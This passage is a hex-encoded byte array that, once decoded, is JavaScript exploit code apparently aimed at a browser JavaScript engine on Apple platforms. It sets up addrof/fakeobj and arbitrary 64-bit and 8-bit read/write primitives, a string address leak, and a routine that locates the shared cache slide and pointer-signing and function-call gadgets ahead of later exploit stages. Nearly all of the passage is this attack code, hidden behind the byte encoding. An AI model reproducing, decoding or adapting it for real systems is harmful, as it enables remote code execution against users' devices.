        0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x6f, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74,
        0x75, 0x72, 0x6e, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x2e, 0x66, 0x72, 0x6f, 0x6d, 0x44,
        0x6f, 0x75, 0x62, 0x6c, 0x65, 0x28, 0x75, 0x6e, 0x62, 0x6f, 0x78, 0x65, 0x64, 0x5f, 0x61, 0x72,
        0x72, 0x5b, 0x30, 0x5d, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x66, 0x61,
        0x6b, 0x65, 0x6f, 0x62, 0x6a, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e,
        0x20, 0x28, 0x61, 0x64, 0x64, 0x72, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x75, 0x6e,
        0x62, 0x6f, 0x78, 0x65, 0x64, 0x5f, 0x61, 0x72, 0x72, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x61,
        0x64, 0x64, 0x72, 0x2e, 0x61, 0x73, 0x44, 0x6f, 0x75, 0x62, 0x6c, 0x65, 0x28, 0x29, 0x3b, 0x0a,
        0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x62, 0x6f, 0x78, 0x65, 0x64,
        0x5f, 0x61, 0x72, 0x72, 0x5b, 0x30, 0x5d, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20,
        0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f,
        0x6e, 0x20, 0x28, 0x77, 0x68, 0x65, 0x72, 0x65, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20,
        0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d,
        0x20, 0x3d, 0x20, 0x77, 0x68, 0x65, 0x72, 0x65, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65,
        0x74, 0x20, 0x72, 0x73, 0x20, 0x3d, 0x20, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b,
        0x30, 0x5d, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f,
        0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20,
        0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x72, 0x73, 0x3b, 0x0a, 0x20, 0x20,
        0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x63, 0x6d, 0x70, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e,
        0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x77, 0x68, 0x65, 0x72, 0x65, 0x2c, 0x20, 0x76, 0x61,
        0x6c, 0x75, 0x65, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72,
        0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68,
        0x65, 0x72, 0x65, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x72, 0x73, 0x20,
        0x3d, 0x20, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x3d,
        0x20, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74,
        0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x30,
        0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x72, 0x73,
        0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34,
        0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x77, 0x68, 0x65,
        0x72, 0x65, 0x2c, 0x20, 0x77, 0x68, 0x61, 0x74, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20,
        0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d,
        0x20, 0x3d, 0x20, 0x77, 0x68, 0x65, 0x72, 0x65, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x77,
        0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x61, 0x74,
        0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72,
        0x72, 0x61, 0x79, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x7d,
        0x3b, 0x0a, 0x20, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x38, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e,
        0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x77, 0x68, 0x65, 0x72, 0x65, 0x29, 0x20, 0x7b, 0x0a,
        0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61,
        0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x65, 0x72, 0x65, 0x3b, 0x0a,
        0x20, 0x20, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x72, 0x73, 0x20, 0x3d, 0x20, 0x72, 0x77, 0x5f,
        0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20,
        0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b,
        0x30, 0x5d, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74,
        0x75, 0x72, 0x6e, 0x20, 0x72, 0x73, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x75,
        0x77, 0x72, 0x69, 0x74, 0x65, 0x38, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f,
        0x6e, 0x20, 0x28, 0x77, 0x68, 0x65, 0x72, 0x65, 0x2c, 0x20, 0x77, 0x68, 0x61, 0x74, 0x29, 0x20,
        0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72,
        0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x65, 0x72, 0x65,
        0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x77, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38,
        0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x61, 0x74, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20,
        0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b,
        0x30, 0x5d, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20,
        0x63, 0x6d, 0x70, 0x38, 0x5f, 0x77, 0x61, 0x69, 0x74, 0x5f, 0x66, 0x6f, 0x72, 0x5f, 0x63, 0x68,
        0x61, 0x6e, 0x67, 0x65, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20,
        0x28, 0x77, 0x68, 0x65, 0x72, 0x65, 0x2c, 0x20, 0x76, 0x61, 0x6c, 0x75, 0x65, 0x29, 0x20, 0x7b,
        0x0a, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x5f, 0x61, 0x72, 0x72,
        0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x77, 0x68, 0x65, 0x72, 0x65, 0x3b,
        0x0a, 0x20, 0x20, 0x20, 0x20, 0x77, 0x68, 0x69, 0x6c, 0x65, 0x20, 0x28, 0x72, 0x77, 0x5f, 0x61,
        0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x3d, 0x20, 0x76, 0x61, 0x6c,
        0x75, 0x65, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x63, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c,
        0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x5f, 0x38, 0x5b, 0x30, 0x5d, 0x20, 0x3d, 0x20, 0x30, 0x6e,
        0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x6d, 0x65, 0x6d, 0x2e, 0x61, 0x64, 0x64,
        0x72, 0x6f, 0x66, 0x20, 0x3d, 0x20, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x3b, 0x0a, 0x20, 0x20,
        0x6d, 0x65, 0x6d, 0x2e, 0x66, 0x61, 0x6b, 0x65, 0x6f, 0x62, 0x6a, 0x20, 0x3d, 0x20, 0x66, 0x61,
        0x6b, 0x65, 0x6f, 0x62, 0x6a, 0x3b, 0x0a, 0x20, 0x20, 0x6d, 0x65, 0x6d, 0x2e, 0x72, 0x65, 0x61,
        0x64, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x3b, 0x0a, 0x20, 0x20,
        0x6d, 0x65, 0x6d, 0x2e, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x77, 0x72,
        0x69, 0x74, 0x65, 0x36, 0x34, 0x3b, 0x0a, 0x20, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34,
        0x20, 0x3d, 0x20, 0x6d, 0x65, 0x6d, 0x2e, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x3b, 0x0a, 0x20,
        0x20, 0x75, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x20, 0x3d, 0x20, 0x6d, 0x65, 0x6d, 0x2e,
        0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x3b, 0x0a, 0x20, 0x20, 0x67, 0x65, 0x74, 0x5f, 0x63,
        0x73, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f,
        0x6e, 0x20, 0x28, 0x6a, 0x73, 0x5f, 0x73, 0x74, 0x72, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20,
        0x20, 0x6c, 0x65, 0x74, 0x20, 0x73, 0x20, 0x3d, 0x20, 0x6a, 0x73, 0x5f, 0x73, 0x74, 0x72, 0x20,
        0x2b, 0x20, 0x22, 0x5c, 0x78, 0x30, 0x30, 0x22, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x5b, 0x5d,
        0x5b, 0x73, 0x5d, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20,
        0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x61, 0x64,
        0x64, 0x72, 0x6f, 0x66, 0x28, 0x73, 0x29, 0x20, 0x2b, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x20,
        0x2b, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20,
        0x6e, 0x65, 0x77, 0x5f, 0x62, 0x69, 0x67, 0x69, 0x6e, 0x74, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e,
        0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72,
        0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x42, 0x69, 0x67, 0x49, 0x6e, 0x74, 0x28, 0x22, 0x30, 0x78,
        0x33, 0x33, 0x33, 0x33, 0x22, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x75,
        0x70, 0x64, 0x61, 0x74, 0x65, 0x5f, 0x62, 0x69, 0x67, 0x69, 0x6e, 0x74, 0x20, 0x3d, 0x20, 0x66,
        0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x62, 0x69, 0x29, 0x20, 0x7b, 0x0a, 0x20,
        0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20, 0x62, 0x69, 0x20, 0x2b, 0x20, 0x30,
        0x78, 0x31, 0x6e, 0x20, 0x2d, 0x20, 0x30, 0x78, 0x31, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x7d, 0x3b,
        0x0a, 0x20, 0x20, 0x67, 0x65, 0x74, 0x5f, 0x62, 0x69, 0x67, 0x69, 0x6e, 0x74, 0x5f, 0x61, 0x64,
        0x64, 0x72, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x62,
        0x69, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6e, 0x20,
        0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x28, 0x62,
        0x69, 0x29, 0x20, 0x2b, 0x20, 0x30, 0x78, 0x31, 0x38, 0x6e, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x7d,
        0x3b, 0x0a, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x20, 0x3d, 0x20, 0x75, 0x6e, 0x64, 0x65,
        0x66, 0x69, 0x6e, 0x65, 0x64, 0x3b, 0x0a, 0x20, 0x20, 0x67, 0x70, 0x75, 0x5f, 0x66, 0x63, 0x61,
        0x6c, 0x6c, 0x20, 0x3d, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x3b, 0x0a,
        0x20, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x72, 0x65, 0x73, 0x6f, 0x6c, 0x76, 0x65, 0x20, 0x3d,
        0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x3b, 0x0a, 0x20, 0x20, 0x70, 0x61,
        0x63, 0x69, 0x61, 0x20, 0x3d, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x3b,
        0x0a, 0x20, 0x20, 0x70, 0x61, 0x63, 0x69, 0x62, 0x20, 0x3d, 0x20, 0x75, 0x6e, 0x64, 0x65, 0x66,
        0x69, 0x6e, 0x65, 0x64, 0x3b, 0x0a, 0x20, 0x20, 0x4c, 0x4f, 0x47, 0x20, 0x3d, 0x20, 0x75, 0x6e,
        0x64, 0x65, 0x66, 0x69, 0x6e, 0x65, 0x64, 0x3b, 0x0a, 0x20, 0x20, 0x69, 0x6e, 0x74, 0x65, 0x67,
        0x72, 0x61, 0x74, 0x65, 0x64, 0x20, 0x3d, 0x20, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3b, 0x0a, 0x20,
        0x20, 0x75, 0x73, 0x65, 0x5f, 0x6a, 0x73, 0x5f, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x3d,
        0x20, 0x66, 0x61, 0x6c, 0x73, 0x65, 0x3b, 0x0a, 0x20, 0x20, 0x5f, 0x43, 0x46, 0x4f, 0x62, 0x6a,
        0x65, 0x63, 0x74, 0x43, 0x6f, 0x70, 0x79, 0x50, 0x72, 0x6f, 0x70, 0x65, 0x72, 0x74, 0x79, 0x20,
        0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x6c, 0x6f, 0x61, 0x64, 0x5f, 0x78, 0x31, 0x78,
        0x33, 0x78, 0x38, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c,
        0x6c, 0x5f, 0x31, 0x34, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x5f,
        0x78, 0x38, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f,
        0x69, 0x73, 0x4e, 0x41, 0x4e, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x67, 0x61, 0x64, 0x67,
        0x65, 0x74, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f,
        0x69, 0x73, 0x4e, 0x41, 0x4e, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x67, 0x61, 0x64, 0x67,
        0x65, 0x74, 0x32, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x78, 0x70, 0x61, 0x63,
        0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20,
        0x73, 0x74, 0x61, 0x67, 0x65, 0x31, 0x5f, 0x6a, 0x73, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a,
        0x20, 0x20, 0x73, 0x74, 0x61, 0x67, 0x65, 0x32, 0x5f, 0x6a, 0x73, 0x20, 0x3d, 0x20, 0x30, 0x6e,
        0x3b, 0x0a, 0x20, 0x20, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5f, 0x61, 0x72, 0x67, 0x20, 0x3d,
        0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x67, 0x65, 0x74, 0x5f, 0x74, 0x68, 0x72, 0x65, 0x61,
        0x64, 0x5f, 0x61, 0x72, 0x67, 0x73, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f,
        0x6e, 0x20, 0x28, 0x29, 0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72,
        0x6e, 0x20, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5f, 0x61, 0x72, 0x67, 0x3b, 0x0a, 0x20, 0x20,
        0x7d, 0x3b, 0x0a, 0x20, 0x20, 0x6c, 0x65, 0x74, 0x20, 0x53, 0x59, 0x53, 0x4c, 0x4f, 0x47, 0x20,
        0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x69, 0x6e,
        0x69, 0x74, 0x20, 0x3d, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x28, 0x29,
        0x20, 0x7b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73,
        0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65,
        0x61, 0x64, 0x36, 0x34, 0x28, 0x61, 0x64, 0x64, 0x72, 0x6f, 0x66, 0x28, 0x66, 0x75, 0x6e, 0x63,
        0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x61, 0x72, 0x72, 0x61, 0x79, 0x29, 0x20,
        0x2b, 0x20, 0x30, 0x78, 0x31, 0x30, 0x6e, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x65,
        0x74, 0x20, 0x69, 0x64, 0x78, 0x20, 0x3d, 0x20, 0x30, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20,
        0x44, 0x4c, 0x53, 0x59, 0x4d, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28,
        0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66,
        0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e,
        0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e,
        0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x64, 0x79, 0x6c, 0x64, 0x5f, 0x73, 0x69, 0x67, 0x6e, 0x50,
        0x6f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x5f, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x20, 0x3d, 0x20,
        0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66,
        0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64,
        0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69,
        0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6a, 0x73,
        0x5f, 0x69, 0x6e, 0x70, 0x75, 0x74, 0x73, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36,
        0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62,
        0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78,
        0x38, 0x6e, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20,
        0x31, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5f, 0x61,
        0x72, 0x67, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e,
        0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72,
        0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0x0a,
        0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0x0a, 0x20,
        0x20, 0x20, 0x20, 0x73, 0x68, 0x61, 0x72, 0x65, 0x64, 0x5f, 0x63, 0x61, 0x63, 0x68, 0x65, 0x5f,
        0x73, 0x6c, 0x69, 0x64, 0x65, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28,
        0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66,
        0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e,
        0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e,
        0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c,
        0x5f, 0x62, 0x75, 0x66, 0x66, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28,
        0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66,
        0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e,
        0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e,
        0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c,
        0x5f, 0x70, 0x63, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75,
        0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65,
        0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b,
        0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0x0a,
        0x20, 0x20, 0x20, 0x20, 0x6a, 0x73, 0x76, 0x6d, 0x5f, 0x66, 0x63, 0x61, 0x6c, 0x6c, 0x5f, 0x61,
        0x72, 0x67, 0x73, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x28, 0x66, 0x75,
        0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x5f, 0x62, 0x75, 0x66, 0x66, 0x65,
        0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20, 0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b,
        0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b, 0x3d, 0x20, 0x31, 0x6e, 0x3b, 0x0a,
        0x20, 0x20, 0x20, 0x20, 0x5f, 0x43, 0x46, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x43, 0x6f, 0x70,
        0x79, 0x50, 0x72, 0x6f, 0x70, 0x65, 0x72, 0x74, 0x79, 0x20, 0x3d, 0x20, 0x75, 0x72, 0x65, 0x61,
        0x64, 0x36, 0x34, 0x28, 0x66, 0x75, 0x6e, 0x63, 0x5f, 0x6f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73,
        0x5f, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x20, 0x2b, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2a, 0x20,
        0x30, 0x78, 0x38, 0x6e, 0x29, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x69, 0x64, 0x78, 0x20, 0x2b,
        0x3d, 0x20, 0x31, 0x6e, 0x3b, 0x0a, 0x20, 0x20, 0x20, 0x20, 0x6c, 0x6f, 0x61, 0x64, 0x5f, 0x78,
